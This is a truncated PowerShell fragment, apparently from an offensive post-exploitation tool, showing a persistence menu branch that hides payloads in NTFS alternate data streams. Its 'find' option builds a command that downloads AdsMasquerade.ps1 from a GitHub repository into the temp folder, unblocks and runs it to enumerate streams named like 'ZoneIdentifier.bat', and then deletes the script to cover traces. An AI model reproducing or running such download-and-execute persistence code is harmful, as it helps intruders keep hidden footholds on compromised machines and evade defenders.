      ...
      If($choise -ieq "Persist" -or $choise -ieq "persistance")
      {
        ...
        If($startup_choise -ieq "ADSRUN" -or $startup_choise -ieq "ADS")
        {
           ...
           ElseIf($Chosen_Option -iMatch '^(find)$')
           {
              ...
              $StartDir = Read-Host;
              Write-host " - Search for 'payload name' or ':' (all) streams : " -NoNewline;
              [string]$streamdata = Read-Host;              
              
              If(-not($StartDir) -or $StartDir -ieq $null){$StartDir = "$Env:USERPROFILE"}
              If(-not($streamdata) -or $streamdata -ieq $null)
              {
                 [string]$streamdata = "ZoneIdentifier.bat"
              }

              Write-Host " * Search in '$StartDir' for streams." -ForegroundColor Green
              $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AdsMasquerade.ps1`" -OutFile `"`$Env:TMP\AdsMasquerade.ps1`"|Unblock-File;powershell -file `$Env:TMP\AdsMasquerade.ps1 -ADS `"enum`" -streamdata `"$streamdata`" -StartDir `"$StartDir`";Remove-Item -Path `"`$Env:TMP\AdsMasquerade.ps1`" -Force";
           }
           ElseIf($Chosen_Option -iMatch '^(clean)$')
           {
              ...
              If(-not($streamdata) -or $streamdata -ieq $null){$streamdata = "ZoneIdentifier.bat"}
